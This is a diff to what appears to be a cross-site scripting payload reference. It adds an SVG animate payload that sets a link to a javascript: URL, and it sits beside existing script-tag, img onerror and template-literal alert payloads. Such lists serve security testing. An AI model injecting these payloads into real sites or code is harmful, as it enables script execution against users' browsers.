@@ -3,6 +3,8 @@
 ```html
 <script>alert(document.domain)</script>
 <img src=1 onerror=alert(1)>
+
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
 ```
 
 # XSS in HTML tag attributes
@@ -107,3 +109,5 @@ payload:
 ```js
 ${alert(document.domain)}
 ```
+
+
